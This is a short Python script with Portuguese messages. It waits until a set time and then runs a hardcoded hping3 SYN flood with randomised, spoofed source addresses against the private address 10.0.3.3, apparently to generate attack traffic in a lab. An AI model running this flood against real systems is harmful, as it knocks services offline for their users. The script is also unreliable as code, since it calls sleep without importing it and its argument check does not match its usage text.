import sys
import os
import time
from datetime import datetime, timedelta

def run_command(command):
    try:
        os.system(command)
    except Exception as e:
        print(f"Erro ao executar o comando: {e}")

def main():
    if len(sys.argv) != 3:
        print("Uso: programa.py HH:MM:SS duracao_em_minutos 'comando'")
        print('Exemplo: python3 h_comando_generico_time_limit.py 19:30:20 1 "curl 10.0.3.3"')
        return
    
    start_time_str = sys.argv[1]
    duration_seconds = int(sys.argv[2])
    #command_to_run = ' '.join(sys.argv[3:])
    command_to_run = "hping3 -d 16 -S -w 64 -p 80 --flood --rand-source 10.0.3.3"
    #command_to_run2= "kill $!"
    #command_to_run2= kill $!"
    #print(command_to_run)

    try:
        start_hour, start_minute, start_second = map(int, start_time_str.split(":"))
    except ValueError:
        print("Formato de hora inválido. Use HH:MM:SS")
        return

    start_time = datetime.now().replace(hour=start_hour, minute=start_minute, second=start_second, microsecond=0)
    end_time = start_time + timedelta(seconds=duration_seconds)
    flag=0 

    while ((datetime.now() < end_time) & (flag==0)):
        if datetime.now() >= start_time:
            run_command(command_to_run)
            sleep(10)
            flag=1


if __name__ == "__main__":
    main()
